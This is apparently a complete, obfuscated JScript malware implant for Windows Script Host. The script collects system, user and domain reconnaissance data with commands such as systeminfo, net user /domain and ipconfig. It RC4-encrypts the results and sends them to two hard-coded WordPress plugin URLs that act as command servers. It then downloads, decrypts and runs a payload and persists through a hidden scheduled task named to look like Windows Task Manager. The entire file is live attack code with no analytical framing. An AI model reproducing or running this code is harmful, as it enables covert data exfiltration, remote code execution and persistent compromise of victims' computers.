function UspD(zDmy) {
  var m3mH = WScript.CreateObject("ADODB.Stream");
  m3mH.Type = 2;
  m3mH.CharSet = '437';
  m3mH.Open();
  m3mH.LoadFromFile(zDmy);
  var c0xi = m3mH.ReadText;
  m3mH.Close();
  return cz_b(c0xi);
}
var CKpR = new Array("http://www.saipadiesel124.com/wp-content/plugins/imsanity/tmp.php", "http://www.folk-cantabria.com/wp-content/plugins/wp-statistics/includes/classes/gallery_create_page_field.php");
var auME = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\\Users\\*.* >> ", "dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ", "dir %userprofile%\\Desktop\\*.* >> ", "tasklist /fi \"modules eq wow64.dll\"  >> ", "tasklist /fi \"modules ne wow64.dll\" >> ", "dir \"%programfiles(x86)%\" >> ", "dir \"%programfiles%\" >> ", "dir %appdata% >>");
var QUjy = new ActiveXObject("Scripting.FileSystemObject");
var LIxF = WScript.ScriptName;
var w5mY = "";
var ruGx = TfOh();
function hLit(XngP, y1qa) {
  char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var Rj3c = "";
  var OKpB = "";
  for (var i = 0; i < XngP.length; ++i) {
    var B8wU = XngP.charCodeAt(i);
    var LUxg = B8wU.toString(2);
    while (LUxg.length < (y1qa ? 8 : 16)) {
      LUxg = "0" + LUxg;
    }
    OKpB += LUxg;
    while (OKpB.length >= 6) {
      var vjUu = OKpB.slice(0, 6);
      OKpB = OKpB.slice(6);
      Rj3c += this.char_set.charAt(parseInt(vjUu, 2));
    }
  }
  if (OKpB) {
    while (OKpB.length < 6) {
      OKpB += "0";
    }
    Rj3c += this.char_set.charAt(parseInt(OKpB, 2));
  }
  while (Rj3c.length % (y1qa ? 4 : 8) != 0) {
    Rj3c += "=";
  }
  return Rj3c;
}
var b92A = [];
b92A.C7 = '80';
b92A.FC = '81';
b92A.E9 = '82';
b92A.E2 = '83';
b92A.E4 = '84';
b92A.E0 = '85';
b92A.E5 = '86';
b92A.E7 = '87';
b92A.EA = '88';
b92A.EB = '89';
b92A.E8 = '8A';
b92A.EF = '8B';
b92A.EE = '8C';
b92A.EC = '8D';
b92A.C4 = '8E';
b92A.C5 = '8F';
b92A.C9 = '90';
b92A.E6 = '91';
b92A.C6 = '92';
b92A.F4 = '93';
b92A.F6 = '94';
b92A.F2 = '95';
b92A.FB = '96';
b92A.F9 = '97';
b92A.FF = '98';
b92A.D6 = '99';
b92A.DC = '9A';
b92A.A2 = '9B';
b92A.A3 = '9C';
b92A.A5 = '9D';
b92A['20A7'] = '9E';
b92A['192'] = '9F';
b92A.E1 = 'A0';
b92A.ED = 'A1';
b92A.F3 = 'A2';
b92A.FA = 'A3';
b92A.F1 = 'A4';
b92A.D1 = 'A5';
b92A.AA = 'A6';
b92A.BA = 'A7';
b92A.BF = 'A8';
b92A['2310'] = 'A9';
b92A.AC = 'AA';
b92A.BD = 'AB';
b92A.BC = 'AC';
b92A.A1 = 'AD';
b92A.AB = 'AE';
b92A.BB = 'AF';
b92A['2591'] = 'B0';
b92A['2592'] = 'B1';
b92A['2593'] = 'B2';
b92A['2502'] = 'B3';
b92A['2524'] = 'B4';
b92A['2561'] = 'B5';
b92A['2562'] = 'B6';
b92A['2556'] = 'B7';
b92A['2555'] = 'B8';
b92A['2563'] = 'B9';
b92A['2551'] = 'BA';
b92A['2557'] = 'BB';
b92A['255D'] = 'BC';
b92A['255C'] = 'BD';
b92A['255B'] = 'BE';
b92A['2510'] = 'BF';
b92A['2514'] = 'C0';
b92A['2534'] = 'C1';
b92A['252C'] = 'C2';
b92A['251C'] = 'C3';
b92A['2500'] = 'C4';
b92A['253C'] = 'C5';
b92A['255E'] = 'C6';
b92A['255F'] = 'C7';
b92A['255A'] = 'C8';
b92A['2554'] = 'C9';
b92A['2569'] = 'CA';
b92A['2566'] = 'CB';
b92A['2560'] = 'CC';
b92A['2550'] = 'CD';
b92A['256C'] = 'CE';
b92A['2567'] = 'CF';
b92A['2568'] = 'D0';
b92A['2564'] = 'D1';
b92A['2565'] = 'D2';
b92A['2559'] = 'D3';
b92A['2558'] = 'D4';
b92A['2552'] = 'D5';
b92A['2553'] = 'D6';
b92A['256B'] = 'D7';
b92A['256A'] = 'D8';
b92A['2518'] = 'D9';
b92A['250C'] = 'DA';
b92A['2588'] = 'DB';
b92A['2584'] = 'DC';
b92A['258C'] = 'DD';
b92A['2590'] = 'DE';
b92A['2580'] = 'DF';
b92A['3B1'] = 'E0';
b92A.DF = 'E1';
b92A['393'] = 'E2';
b92A['3C0'] = 'E3';
b92A['3A3'] = 'E4';
b92A['3C3'] = 'E5';
b92A.B5 = 'E6';
b92A['3C4'] = 'E7';
b92A['3A6'] = 'E8';
b92A['398'] = 'E9';
b92A['3A9'] = 'EA';
b92A['3B4'] = 'EB';
b92A['221E'] = 'EC';
b92A['3C6'] = 'ED';
b92A['3B5'] = 'EE';
b92A['2229'] = 'EF';
b92A['2261'] = 'F0';
b92A.B1 = 'F1';
b92A['2265'] = 'F2';
b92A['2264'] = 'F3';
b92A['2320'] = 'F4';
b92A['2321'] = 'F5';
b92A.F7 = 'F6';
b92A['2248'] = 'F7';
b92A.B0 = 'F8';
b92A['2219'] = 'F9';
b92A.B7 = 'FA';
b92A['221A'] = 'FB';
b92A['207F'] = 'FC';
b92A.B2 = 'FD';
b92A['25A0'] = 'FE';
b92A.A0 = 'FF';
function TfOh() {
  var ayuh = Math.ceil(Math.random() * 10 + 25);
  var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
  var dc9V = WScript.CreateObject("WScript.Network");
  w5mY = dc9V.UserName;
  for (var count = 0; count < ayuh; count++) {
    switch (Math.ceil(Math.random() * 3)) {
      case 1:
        name = name + Math.ceil(Math.random() * 8);
        break;
      case 2:
        name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
        break;
      default:
        name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
        break;
    }
  }
  return name;
}
var wyKN = Blgx(bIdG());
try {
  var WE86 = bIdG();
  rGcR();
  jSm8();
} catch (e) {
  WScript.Quit();
}
function jSm8() {
  var c9lr = Fv6b();
  while (true) {
    for (var i = 0; i < CKpR.length; i++) {
      var Ysyo = CKpR[i];
      var f3cb = XEWG(Ysyo, c9lr);
      switch (f3cb) {
        case "good":
          break;
        case "exit":
          WScript.Quit();
          break;
        case "work":
          XBL3(Ysyo);
          break;
        case "fail":
          tbMu();
          break;
        default:
          break;
      }
      TfOh();
    }
    WScript.Sleep((Math.random() * 300 + 3600) * 1000);
  }
}
function bIdG() {
  var spq3 = this.ActiveXObject;
  var zBVv = new spq3("WScript.Shell");
  return zBVv;
}
function XBL3(B_TG) {
  var YIme = wyKN + LIxF.substring(0, LIxF.length - 2) + "pif";
  var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");
  Kpxo.OPEN("post", B_TG, false);
  Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());
  Kpxo.SETREQUESTHEADER("content-type:", "application/octet-stream");
  Kpxo.SETREQUESTHEADER("content-length:", "4");
  Kpxo.SEND("work");
  if (QUjy.FILEEXISTS(YIme)) {
    QUjy.DELETEFILE(YIme);
  }
  if (Kpxo.STATUS == 200) {
    var m3mH = new ActiveXObject("ADODB.STREAM");
    m3mH.TYPE = 1;
    m3mH.OPEN();
    m3mH.WRITE(Kpxo.responseBody);
    m3mH.Position = 0;
    m3mH.Type = 2;
    m3mH.CharSet = "437";
    var c0xi = m3mH.ReadText(m3mH.Size);
    var ptF0 = FXx9("2f532d6baec3d0ec7b1f98aed4774843", cz_b(c0xi));
    NoRS(ptF0, YIme);
    m3mH.Close();
  }
  c5ae(YIme, B_TG);
  WScript.Sleep(30000);
  QUjy.DELETEFILE(YIme);
}
function tbMu() {
  QUjy.DELETEFILE(WScript.SCRIPTFULLNAME);
  eV_C("TaskManager", "Windows Task Manager", w5mY, v_FileName, "EzZETcSXyKAdF_e5I2i1", wyKN, false);
  KhDn("TaskManager");
  WScript.Quit();
}
function XEWG(uXHK, hm2j) {
  try {
    var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");
    Kpxo.OPEN("post", uXHK, false);
    Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());
    Kpxo.SETREQUESTHEADER("content-type:", "application/octet-stream");
    var rRi3 = hLit(hm2j, true);
    Kpxo.SETREQUESTHEADER("content-length:", rRi3.length);
    Kpxo.SEND(rRi3);
    return Kpxo.responseText;
  } catch (e) {
    return "";
  }
}
function Sz8k() {
  var n9mV = "";
  var dc9V = WScript.CreateObject("WScript.Network");
  var rRi3 = "w3LxnRSbJcqf8HrU" + dc9V.ComputerName + w5mY;
  for (var i = 0; i < 16; i++) {
    var YsXA = 0;
    for (var j = i; j < rRi3.length - 1; j++) {
      YsXA = YsXA ^ rRi3.charCodeAt(j);
    }
    YsXA = YsXA % 10;
    n9mV = n9mV + YsXA.toString(10);
  }
  n9mV = n9mV + "w3LxnRSbJcqf8HrU";
  return n9mV;
}
function rGcR() {
  v_FileName = wyKN + LIxF.substring(0, LIxF.length - 2) + "js";
  QUjy.COPYFILE(WScript.ScriptFullName, wyKN + LIxF);
  var HFp7 = (Math.random() * 150 + 350) * 1000;
  WScript.Sleep(HFp7);
  eV_C("TaskManager", "Windows Task Manager", w5mY, v_FileName, "EzZETcSXyKAdF_e5I2i1", wyKN, true);
}
function Fv6b() {
  var m_Rr = wyKN + "~dat.tmp";
  for (var i = 0; i < auME.length; i++) {
    WE86.Run("cmd.exe /c " + auME[i] + "\"" + m_Rr + "\"", 0, true);
  }
  var nRVN = UspD(m_Rr);
  WScript.Sleep(1000);
  QUjy.DELETEFILE(m_Rr);
  return FXx9("2f532d6baec3d0ec7b1f98aed4774843", nRVN);
}
function c5ae(YIme, B_TG) {
  try {
    if (QUjy.FILEEXISTS(YIme)) {
      WE86.Run("\"" + YIme + "\"");
    }
  } catch (e) {
    var Kpxo = new ActiveXObject("MSXML2.XMLHTTP");
    Kpxo.OPEN("post", B_TG, false);
    Kpxo.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + Sz8k());
    Kpxo.SETREQUESTHEADER("content-type:", "application/octet-stream");
    Kpxo.SETREQUESTHEADER("content-length:", "error".length);
    Kpxo.SEND("error");
    return "";
  }
}
function RPbY(r_X5) {
  var yjrw = "0123456789ABCDEF".substr(r_X5 & 15, 1);
  while (r_X5 > 15) {
    r_X5 >= 4;
    yjrw = "0123456789ABCDEF".substr(r_X5 & 15, 1) + yjrw;
  }
  return yjrw;
}
function NptO(jlEi) {
  return parseInt(jlEi, 16);
}
function eV_C(Bjmr, RT6x, O7Ec, YBwP, T9Px, egNr, rmGH) {
  try {
    var BGfI = WScript.CreateObject("Schedule.Service");
    BGfI.Connect();
    var w2cQ = BGfI.GetFolder("WPD");
    var xSm3 = BGfI.NewTask(0);
    xSm3.Principal.UserId = O7Ec;
    xSm3.Principal.LogonType = 6;
    var wK2F = xSm3.RegistrationInfo;
    wK2F.Description = RT6x;
    wK2F.Author = O7Ec;
    var aYbx = xSm3.Settings;
    aYbx.Enabled = true;
    aYbx.StartWhenAvailable = true;
    aYbx.Hidden = rmGH;
    var LDoN = xSm3.Triggers;
    var r9EC = LDoN.Create(9);
    r9EC.StartBoundary = "2015-07-12T11:47:24";
    r9EC.EndBoundary = "2020-03-21T08:00:00";
    r9EC.Id = "LogonTriggerId";
    r9EC.UserId = O7Ec;
    r9EC.Enabled = true;
    var gQu9 = xSm3.Actions.Create(0);
    gQu9.Path = YBwP;
    gQu9.Arguments = T9Px;
    gQu9.WorkingDirectory = egNr;
    w2cQ.RegisterTaskDefinition(Bjmr, xSm3, 6, "", "", 3);
    return true;
  } catch (Err) {
    return false;
  }
}
function KhDn(Bjmr) {
  try {
    var UGgw = false;
    var BGfI = WScript.CreateObject("Schedule.Service");
    BGfI.Connect();
    var w2cQ = BGfI.GetFolder("WPD");
    var FLs6 = w2cQ.GetTasks(0);
    if (FLs6.count >= 0) {
      var gk1H = new Enumerator(FLs6);
      for (; !gk1H.atEnd(); gk1H.moveNext()) {
        if (gk1H.item().name == Bjmr) {
          w2cQ.DeleteTask(Bjmr, 0);
          UGgw = true;
        }
      }
    }
  } catch (Err) {
    return false;
  }
}
function cz_b(S3Ws) {
  var n9mV = [];
  var mvAu = S3Ws.length;
  for (var i = 0; i < mvAu; i++) {
    var wtVX = S3Ws.charCodeAt(i);
    if (wtVX >= 128) {
      var h = b92A['' + RPbY(wtVX)];
      wtVX = parseInt(h, 16);
    }
    n9mV.push(wtVX);
  }
  return n9mV;
}
function NoRS(ExY2, igeK) {
  var m3mH = WScript.CreateObject("ADODB.Stream");
  m3mH.type = 2;
  m3mH.Charset = "iso-8859-1";
  m3mH.Open();
  m3mH.WriteText(ExY2);
  m3mH.Flush();
  m3mH.Position = 0;
  m3mH.SaveToFile(igeK, 2);
  m3mH.close();
}
function Blgx(gaWo) {
  wyKN = "c:\\Users\\" + w5mY + "\\AppData\\Local\\Microsoft\\Windows\\";
  if (!QUjy.FOLDEREXISTS(wyKN)) {
    wyKN = "c:\\Users\\" + w5mY + "\\AppData\\Local\\Temp\\";
  }
  if (!QUjy.FOLDEREXISTS(wyKN)) {
    wyKN = "c:\\Documents and Settings\\" + w5mY + "\\Application Data\\Microsoft\\Windows\\";
  }
  return wyKN;
}
function FXx9(Z_3F, VMd7) {
  var NNSX = [];
  var JDro = 0;
  var KagY;
  var n9mV = '';
  for (var i = 0; i < 256; i++) {
    NNSX[i] = i;
  }
  for (var i = 0; i < 256; i++) {
    JDro = (JDro + NNSX[i] + Z_3F.charCodeAt(i % Z_3F.length)) % 256;
    KagY = NNSX[i];
    NNSX[i] = NNSX[JDro];
    NNSX[JDro] = KagY;
  }
  var i = 0;
  var JDro = 0;
  for (var y = 0; y < VMd7.length; y++) {
    i = (i + 1) % 256;
    JDro = (JDro + NNSX[i]) % 256;
    KagY = NNSX[i];
    NNSX[i] = NNSX[JDro];
    NNSX[JDro] = KagY;
    n9mV += String.fromCharCode(VMd7[y] ^ NNSX[(NNSX[i] + NNSX[JDro]) % 256]);
  }
  return n9mV;
}
